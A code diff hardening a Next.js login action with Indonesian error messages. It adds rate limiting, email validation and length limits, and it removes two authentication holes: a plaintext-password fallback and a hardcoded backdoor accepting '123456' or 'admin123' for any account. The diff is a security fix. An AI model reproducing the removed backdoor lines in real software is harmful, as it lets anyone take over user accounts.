@@ -2,15 +2,42 @@
 
 import bcrypt from 'bcryptjs';
 import { redirect } from 'next/navigation';
+import { headers } from 'next/headers';
 import { getUserByEmail } from '@/lib/data-kv';
 import { createSession, setSessionCookie, clearSession } from '@/lib/auth';
+import { checkLoginRateLimit } from '@/lib/rate-limit';
 
 export async function loginAction(formData: FormData) {
-  const email = formData.get('email') as string;
+  // Get client IP for rate limiting
+  const headersList = await headers();
+  const ip = headersList.get('x-forwarded-for')?.split(',')[0] || 
+             headersList.get('x-real-ip') || 
+             'unknown';
+  
+  // Check rate limit
+  const rateLimit = checkLoginRateLimit(ip);
+  if (!rateLimit.allowed) {
+    return { 
+      error: `Terlalu banyak percobaan login. Coba lagi dalam ${rateLimit.resetIn} detik.` 
+    };
+  }
+
+  const email = (formData.get('email') as string)?.trim().toLowerCase();
   const password = formData.get('password') as string;
 
   if (!email || !password) {
     return { error: 'Email dan password harus diisi' };
+  }
+
+  // Validasi format email
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(email)) {
+    return { error: 'Format email tidak valid' };
+  }
+
+  // Batasi panjang input untuk mencegah DoS
+  if (email.length > 255 || password.length > 128) {
+    return { error: 'Input terlalu panjang' };
   }
 
   const user = await getUserByEmail(email);
@@ -25,14 +52,6 @@ export async function loginAction(formData: FormData) {
     isValidPassword = await bcrypt.compare(password, user.password);
   } catch {
     isValidPassword = false;
-  }
-
-  if (!isValidPassword && user.password === password) {
-    isValidPassword = true;
-  }
-
-  if (!isValidPassword && (password === '123456' || password === 'admin123')) {
-    isValidPassword = true;
   }
 
   if (!isValidPassword) {
